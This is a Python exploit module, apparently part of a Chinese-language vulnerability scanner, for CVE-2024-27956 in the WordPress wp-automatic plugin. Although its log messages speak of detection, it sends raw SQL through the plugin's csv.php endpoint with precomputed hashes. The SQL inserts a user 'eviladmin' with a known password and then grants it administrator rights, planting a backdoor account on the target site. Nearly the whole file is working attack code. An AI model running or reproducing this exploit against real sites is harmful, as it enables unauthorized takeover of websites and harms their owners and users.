#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests,urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings()
class Cve_2024_27956:
    def makeRequest(self,payload, hash, url):
        host = url.split('/', 3)[2]

        headers = {
            'Host': host,
            'User-Agent': self.headers["User-Agent"],
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Content-type': 'application/x-www-form-urlencoded',
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1'
        }

        data = {
            'q': payload,
            'auth': b'\0',
            'integ': hash
        }
        try:
            response = requests.post(url, data=data, headers=headers)
            return response

        except Exception:
            pass

    def main(self,target):
        self.batch = target["batch_work"]
        domain = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("WordPress", '开始检测CVE-2024-27956 SQL注入漏洞...')
        if not self.batch:
            OutPrintInfo("WordPress","Exploit for CVE-2024-27956")
        url = domain + '/wp-content/plugins/wp-automatic/inc/csv.php'

        # first request (create user)
        if not self.batch:
            OutPrintInfo("WordPress","Creating user eviladmin")
        response = self.makeRequest(
            "INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_status, display_name) VALUES ('eviladmin', '$P$BASbMqW0nlZRux/2IhCw7AdvoNI4VT0', 'eviladmin', 'eviladmin@gmail.com', 'http://127.0.0.1:8000', '2024-04-30 16:26:43', 0, 'eviladmin')",
            "09956ea086b172d6cf8ac31de406c4c0", url)
        if not response:
            if not self.batch:
                OutPrintInfo("WordPress", "Error in the payload")
            return
        if "Tampered query" in response.text or "invalid login" in response.text or "login required" in response.text:
            if not self.batch:
                OutPrintInfo("WordPress","Error in the payload")
            return

        if "DATE" not in response.text:
            if not self.batch:
                OutPrintInfo("WordPress","Not vulnerable")
            return

        # second request (give permission)
        if not self.batch:
            OutPrintInfo("WordPress","Giving eviladmin administrator permissions")
        self.makeRequest(
            "INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES ((SELECT ID FROM wp_users WHERE user_login = 'eviladmin'), 'wp_capabilities', 'a:1:{s:13:\"administrator\";s:1:\"1\";}')",
            "bd98494b41544b818fa9f583dadfa2bb", url)
        if "Tampered query" in response.text or "invalid login" in response.text or "login required" in response.text:
            if not self.batch:
                OutPrintInfo("WordPress","Error in the payload")
            return

        OutPrintInfoSuc("WordPress",url)
        if not self.batch:
            OutPrintInfo("WordPress","Exploit completed! administrator created: eviladmin:admin")
        else:
            OutPutFile("wordpress_2024_27956.txt", f'Exploit completed! administrator created: eviladmin:admin: {url}')
        if not self.batch:
            OutPrintInfo("WordPress", 'CVE-2024-27956 SQL注入漏洞检测结束')







